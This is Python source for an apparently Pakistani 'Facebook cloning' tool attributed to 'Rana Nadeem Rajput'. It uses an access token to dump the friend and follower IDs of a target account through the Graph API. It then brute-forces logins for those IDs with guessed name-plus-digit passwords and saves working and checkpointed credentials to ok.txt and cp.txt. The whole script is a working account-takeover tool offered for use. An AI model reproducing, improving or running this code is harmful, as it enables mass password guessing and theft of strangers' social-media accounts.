...
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO MR. RANA
...
def linex():
	os.system('echo  "\n\x1b[1;97m Cloning Start Now Please wait\nTurn On Flight Mode for 5 Seccond\n" | lolcat -a -d 2 -s 50')
def logo():
	os.system("clear")
...
|_   __ \        / \     |_   \|_   _|     / \      
  ...
  |  __ /      / ___ \     | |\ \| |     / ___ \    
  | |  \ \_  _/ /   \ \_  _| |_\   |_  _/ /   \ \_  
|____| |___||____| |____||_____|\____||____| |____| 
\x1b[1;97m----------------------------------------------
\033[1;37m{∆} Tool Author: \033[1;37mRana Nadeem Rajput
\033[1;37m{∆} WhatsApp   : \033[1;37m+923082503426             
\033[1;37m{∆} Facebook   : ITXRANA.5214
\x1b[1;97m----------------------------------------------""")
def main():
	os.system("clear")
	logo()
	print("\t\033[97;1m      MAIN MENU\x1b[0m")
	print("---------------------------------------------")
	print("\033[97;1m  [1] START CRACK")
	print("\033[97;1m  [2] DUMP/EXTRACT USERIDS")
	print("\033[97;1m  [3] HOW TO GET ACCESS TOKEN")
	print("\033[97;1m  [4] DELETE OLD DUMPED FILE")
	print("\033[97;1m  [5] UPDATE TOOL")
	print("\033[97;1m  [J] JOIN MR. RANA GROUP ")
	print("\033[97;1m  [0] EXIT")
	print("---------------------------------------------")
	log_sel()
	
def log_sel():
	sel = raw_input("\033[97;1m  CHOOSE: \033[92;1m")
	if sel == "":
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/ITXRANA.5214"])
		main()
	elif sel =="4" or sel =="04":
		import os
		os.system("rm -rf /sdcard/userids.txt")
		xox("\n\033[97;1m  THE FILE HAS BEEN SUCCESSFULLY DELETED\n")
		raw_input("\033[97;1m  PRESS ENTER TO BACK")
		main()
	elif sel =="5" or sel =="05":
		import os
		try:
			os.system("git clone https://github.com/Rananadeem5214/fast_crack.git")
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/groups/itxrana.5214/"])
		main()
...
def token():
    ...
    try:
        ...
        logo()
        print("")
        print("\t\033[97;1m  LOGIN TOKEN")
        print("")
        token = raw_input("\033[97;1m PASTE TOKEN HERE: \033[97;1m")
        sav = open("Rana_token.txt", "w")
        sav.write(token)
        sav.close()
        token_check()
        menu()
...
def token_check():
	try:
		token=open('Rana_token.txt','r').read()
	except IOError:
		print"\033[91;1m[!] TOKEN INVALID"
		os.system('rm -rf Rana_token.txt')
...
def menu():
    ...
    try:
        ...
        logo()
        print("")
        print("\033[97;1m     LOGGED IN TOKEN HAS EXPIRED")
        os.system("rm -rf Rana_token.txt")
        print("")
        time.sleep(1)
        main()
    ...
    logo()
    print("------------------------------------------")
    print("\033[97;1m     HELLO   : \033[97;1m"+xn)
 #   print("\033[93;1m     REGION  : \033[92;1m") + loc
    print("\033[97;1m     IP : \033[97;1m") + ip
    print("------------------------------------------")
    print("         WELLCOME TO RANA TOOLS")

    print("------------------------------------------")
    print("\033[97;1m  [1] CRACK WITH AUTO PASS")
    print("\033[97;1m  [2] CRACK WITH MANUAL PASS")
    print('\033[97;1m  [0] BACK')
    print("------------------------------------------")
    menu_option()
    
def menu_option():
	select = raw_input("\033[97;1m  CHOOSE OPINION: ")
	if select =="1":
		crack1()
	elif select =="2":
		crack()
		...
		print("")
		print("\t\033[97;1m     SELECT VALID OPTION")
		print("")
		menu_option()
...
def crack1():
	...
	logo()
	print("")
	print("\t\033[97;1m CRACK WITH AUTO PASS")
	print("---------------------------------------------")
	print("\033[97;1m  [1] CRACK PUBLIC ID")
	print("\033[97;1m  [2] CRACK FOLLOWERS")
...
def crack_select1():
	...
	if select =="1":
		...
		logo()
		print("")
		idt = raw_input("\033[97;1m  INPUT PUBLIC ID : ")
		try:
			...
			logo()
			print("---------------------------------------------")
			print("\t\033[97;1m  AUTO PASS CRACKING")
			print("---------------------------------------------")
			print("\033[97;1m  CLONING FROM : \033[97;1m"+q["name"].upper())
			print("\033[97;1m  TARGET UID   : \033[97;1m"+q["id"])
			print("---------------------------------------------")
		except KeyError:
		...
		logo()
		print("---------------------------------------------")
		idt = raw_input("\033[97;1m  INPUT FOLLOWER ID : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			...
			print("---------------------------------------------")
			print("\033[97;1m  CLONING FROM : \033[97;1m"+q["name"].upper())
			print("\033[97;1m  TARGET USER ID   : \033[97;1m"+q["id"])
		except KeyError:
			print("\t\033[91;1m     INVALID LINK OR TOKEN")
			print("")
			raw_input("\033[97;1m PRESS ENTER TO BACK")
		...
		print("\t\033[97;1m   AUTO PASS CRACKING")
		print("---------------------------------------------")
		filelist = raw_input('\033[97;1m  INPUT FILE: ')
		try:
			for line in open(filelist, 'r').readlines():
				id.append(line.strip())
				
		except IOError:
			print("\t\033[97;1m  REQUESTED FILE NOT FOUND")
			print("---------------------------------------------")
			raw_input("\033[97;1m PRESS ENTER TO BACK")
			crack1()
		...
		print("---------------------------------------------")
		crack_select1()
	print("\033[97;1m  TOTAL IDS : \033[97;1m"+str(len(id)))
	print("\033[97;1m  THE PROCESS HAS STARTED")
	print("\033[97;1m  BRUTE HAS BEEN STARTED\x1b[0m")
	print("---------------------------------------------")
	linex()
	def main(arg):
		user=arg
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;37m [RANA-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;37m [RANA-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;37m [RANA-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;37m [RANA-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;37m [RANA-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m [RANA-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;37m [RANA-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m [RANA-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;37m [RANA-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	data = requests.get(api, params=params, headers=headers_)
																	if "access_token" in data.text and "EAAA" in data.text:
																		print(" \033[1;32m [RANA-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;37m [RANA-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
	...
	linex()
	print("----------------------------------")
	print("\033[97;1m THE PROCESS HAS BEEN COMPLETED")
	print("\033[97;1m TOTAL \033[92;1mOK\033[97;1m/\033[97;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("----------------------------------")
	linex()
	print("")
	raw_input("\033[97;1m PRESS ENTER TO BACK ")
...
def crack():
	...
	logo()
	print("")
	print("\t\033[97;1m  MANUAL PASS CRACKING")
	print("")
	print("\033[97;1m  [1] CRACK PUBLIC ID")
	print("\033[97;1m  [2] CRACK FOLLOWERS")
	print("\033[97;1m  [3] CRACK FILE")
...
def crack_select():
	...
	if select =="1":
		...
		print("\t\033[97;1m  MANUAL PASS CRACKING")
		print("---------------------------------------------")
		print("\033[97;1m  EXAMPLE :\033[97;1m 12, 1122, 321, 1234, 786 ETC")
		print("---------------------------------------------")
		idt = raw_input("\n\033[97;1m  INPUT PUBLIC ID : ")
		print("---------------------------------------------")
		p1 = raw_input("\033[97;1m  NAME + DIGIT PASSWORD 1: ")
		p2 = raw_input("\033[97;1m  NAME + DIGIT PASSWORD 2: ")
		p3 = raw_input("\033[97;1m  NAME + DIGIT PASSWORD 3: ")
		p4 = raw_input("\033[97;1m  NAME + DIGIT PASSWORD 4: ")
		print("---------------------------------------------")
		print("\033[97;1m  EXAMPLE :\033[97;1m 102030, 223344, 556677, 786786 ETC ")
		print("---------------------------------------------")
		pass5 = raw_input("\033[97;1m  PASSWORD 5: ")
		pass6 = raw_input("\033[97;1m  PASSWORD 6: ")
		pass7 = raw_input("\033[97;1m  PASSWORD 7: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			...
			print("\t\033[97;1m  INVALID LINK OR TOKEN")
			print("---------------------------------------------")
		...
		print("\033[97;1m  EXAMPLE :\033[97;1m 12, 1122, 321, 1234, 786 ETC")
		print("---------------------------------------------")
		idt = raw_input("\n\033[97;1m  INPUT PUBLIC FOLLOWER ID : ")
		print("---------------------------------------------")
		p1 = raw_input("\033[97;1m  NAME + DIGIT PASSWORD 1: ")
		p2 = raw_input("\033[97;1m  NAME + DIGIT PASSWORD 2: ")
		p3 = raw_input("\033[97;1m  NAME + DIGIT PASSWORD 3: ")
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;33m [RANA-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
																			cps.append(uid+pass8)
...
def dump_menu():
    ...
    logo()
    print("---------------------------------------------")
    print("\033[97;1m  [1] DUMP FROM PUBLIC ")
    print("\033[97;1m  [2] DUMP FROM FOLLOWER")
    print('\033[97;1m  [0] BACK')
    print("---------------------------------------------")
    dump_sel()
...
def dump_sel():
	select = raw_input("\033[97;1m  CHOOSE : \033[92;1m")
	if select =="1":
		dump()
	elif select =="2":
		dump_f()
...
def dump():
    ...
    logo()
    print("---------------------------------------------")
    print '\033[97;1m      DUMP PUBLIC ID FRIEND LIST'
    print("---------------------------------------------")
    idh = raw_input('\033[97;1m   INPUT ID: ')
    try:
        ...
        q = json.loads(r.text)
        print '\033[97;1m   DUMPING FROM: \033[92;1m' + q['name'].upper()
    except KeyError:
        print ''
        print '\033[97;1m  INVALID ID PROVIDED'
        print ''
        raw_input('\033[97;1m  PRESS ENTER TO BACK')
        dump()
    ...
    ids.close()
    print("---------------------------------------------")
    print '\033[97;1m THE PROCESS HAS COMPLETED'
    print '\033[97;1m TOTAL IDS: \033[97;1m' + str(len(idg))
    print("---------------------------------------------")
    linex()
    print("---------------------------------------------")
    print('\033[97;1m FILE DOWNLOADED SUCCESSFULLY')
    print('\033[97;1m FILE SAVED IN >> /sdcard/userids.txt')
    print("---------------------------------------------")
    raw_input("\033[93;1m PRESS ENTER TO BACK")
    dump()
...
def dump_f():
    ...
    logo()
    print("---------------------------------------------")
    print '\033[97;1m      DUMP PUBLIC ID FOLLOW LIST'
    print("---------------------------------------------")
